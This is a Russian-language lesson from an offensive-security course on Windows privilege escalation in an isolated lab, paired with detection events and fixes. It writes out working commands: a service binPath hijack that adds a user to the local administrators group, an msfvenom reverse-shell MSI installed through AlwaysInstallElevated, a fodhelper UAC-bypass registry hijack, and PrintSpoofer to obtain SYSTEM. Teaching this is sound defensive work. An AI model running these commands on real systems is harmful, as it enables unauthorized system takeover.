# 10.4 — Windows privesc

> **M10 · Этап 1 · 5 ч · 🟡 · артефакт:** `labs/m10-privesc/l04-win-system/`

## Цель

Пройти путь от обычного пользователя до `SYSTEM`/администратора на Windows, используя конфигурацию: привилегии токена, службы, задачи, UAC и weak permissions.

## Результат

- Три рабочих пути до `SYSTEM` в лаборатории.
- Понимание, почему каждый путь работает (а не «запустил эксплойт»).
- Таблица «путь → событие → фикс».

## Теория

### 1. Токен и привилегии

Windows-процесс работает в контексте токена. Опасные привилегии:

| Привилегия | Что даёт | Типичный вектор |
|---|---|---|
| `SeImpersonatePrivilege` | выдать себя за клиента | Potato-семейство |
| `SeAssignPrimaryTokenPrivilege` | подменить токен процесса | Potato |
| `SeBackupPrivilege` | читать в обход ACL | копирование SAM/NTDS.dit |
| `SeRestorePrivilege` | писать в обход ACL | подмена бинарника службы |
| `SeTakeOwnershipPrivilege` | взять владение объектом | правка прав файла/ключа |
| `SeDebugPrivilege` | открыть любой процесс | дамп LSASS |
| `SeLoadDriverPrivilege` | загрузить драйвер | уязвимый драйвер |

`SeImpersonate` по умолчанию есть у служб IIS, MSSQL, `NETWORK SERVICE` в ряде конфигураций — поэтому Potato-атаки так популярны.

### 2. Службы

- **Unquoted service path:** `C:\Program Files\My App\svc.exe` без кавычек → Windows пробует `C:\Program.exe`.
- **Weak service permissions:** `SERVICE_CHANGE_CONFIG` у `Users` → меняем `binPath` на свой.
- **Weak directory permissions:** бинарник нельзя изменить, но каталог — можно (подмена DLL или самого exe).
- **DLL hijacking:** служба грузит DLL из writable-каталога.
- **`sc qc`**, `accesschk`, `icacls` — базовые инструменты проверки.

### 3. UAC

UAC — не граница безопасности, а UX-механизм. Если пользователь в группе Administrators, но процесс запущен со средним integrity, обход UAC даёт high integrity. Классика: `fodhelper.exe`, `computerdefaults.exe`, `sdclt.exe` через `HKCU\Software\Classes\ms-settings\shell\open\command`. На современных сборках часть техник закрыта, но принцип «auto-elevated бинарник + контролируемый ключ реестра» остаётся.

### 4. Задачи и autoruns

Задача планировщика, запускающаяся от `SYSTEM` и вызывающая writable-скрипт, — прямой путь. Проверяйте `Get-ScheduledTask`, аргументы, рабочий каталог, ACL на скрипт.

### 5. Potato-семейство

Идея: заставить привилегированный процесс аутентифицироваться к нашему локальному listener, забрать токен и имперсонировать.

- **JuicyPotato** — старые Windows, COM/DCOM.
- **RoguePotato / SweetPotato** — обход ограничений.
- **PrintSpoofer** — через named pipe spooler.
- **GodPotato** — современные сборки.

Требование почти всегда одно: `SeImpersonatePrivilege`.

### 6. Ядро — в последнюю очередь

Kernel exploit (например, устаревший `CVE-2021-1732`) может уронить хост, не совпасть с билдом и оставить следы. Сначала конфигурация, потом патчи, потом ядро.

## Лаборатория

> Цель `WIN01` — Windows 10/11 Evaluation в изолированной сети VMnet2. Снимок до начала обязателен.

### 1. Контекст и привилегии

```powershell
whoami /all
whoami /priv
```

Ожидаемо: список групп, integrity level, привилегии. Найдите `SeImpersonatePrivilege` или `SeBackupPrivilege`.

### 2. Службы и пути

```powershell
Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } |
  Select-Object Name,PathName,StartName

accesschk.exe -uwcqv "Users" * 2>$null
accesschk.exe -uwcqv "Authenticated Users" * 2>$null
```

Ожидаемо: службы без кавычек и объекты с `SERVICE_ALL_ACCESS`/`SERVICE_CHANGE_CONFIG` для обычных пользователей.

### 3. Unquoted path

Если найден путь `C:\Program Files\Vuln App\service.exe`:

```powershell
# проверить, что C:\Program Files\Vuln App writable нельзя, а C:\ — можно (нельзя на нормальной системе)
icacls "C:\Program Files\Vuln App"
# в учебной лабе создаём имитацию: C:\Vuln App\svc.exe + право записи на C:\
copy C:\Windows\System32\cmd.exe "C:\Vuln.exe"
sc stop VulnSvc
sc start VulnSvc
```

Ожидаемо: запускается `C:\Vuln.exe` от имени `LocalSystem`. В реальной системе `C:\` защищён, поэтому путь эксплуатируется только при ошибочных правах.

### 4. Слабая служба

```powershell
# найти службу, где Users имеет SERVICE_CHANGE_CONFIG
sc config VulnSvc binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators alice /add"
sc stop VulnSvc
sc start VulnSvc
net localgroup administrators
```

Ожидаемо: `alice` добавлена в локальные администраторы. Верните снимок.

### 5. AlwaysInstallElevated

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Если оба `0x1`:

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

Ожидаемо: обратная оболочка от `SYSTEM`. В лабе включайте политику только на снимке.

### 6. UAC bypass (fodhelper)

```powershell
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "C:\Windows\System32\cmd.exe /c start cmd.exe" /f
fodhelper.exe
```

Ожидаемо: новое окно `cmd.exe` с high integrity (проверьте `whoami /groups` → `High Mandatory Level`). Если не сработало — сборка закрыла путь, зафиксируйте это.

### 7. Potato

```powershell
# PrintSpoofer64.exe заранее скачан в C:\lab
C:\lab\PrintSpoofer64.exe -i -c "cmd /c whoami"
```

Ожидаемо: `nt authority\system`. Требуется `SeImpersonatePrivilege`.

### 8. Фиксация

Для каждого успешного пути запишите:

| Путь | Предусловие | Команда | Событие детекта | Фикс |
|---|---|---|---|---|

## Атака и защита

- **Атака:** токен → Potato; служба → `binPath`; UAC → auto-elevate; задачи → writable script.
- **Детект:** 4688 (необычный родитель/командная строка), 7045 (новая служба), Sysmon 1/11/13, 4672 (special privileges), 4624 type 9 (`advapi`/`seclogo`), Defender ASR.
- **Фикс:** кавычки в путях, минимальные права на службы и каталоги, `AlwaysInstallElevated=0`, актуальные патчи, LAPS, WDAC/AppLocker, аудит.

## Самопроверка

- [ ] Чем `SeImpersonatePrivilege` отличается от `SeAssignPrimaryTokenPrivilege`?
- [ ] Почему unquoted path опасен только при слабых правах на каталог?
- [ ] Как UAC bypass соотносится с «пользователь уже администратор»?
- [ ] Почему kernel exploit — плохой первый выбор?
- [ ] Какое событие покажет создание службы?

## Дальше

[10.5 — Дамп кредов и reuse](l05-credential-dumping.md)
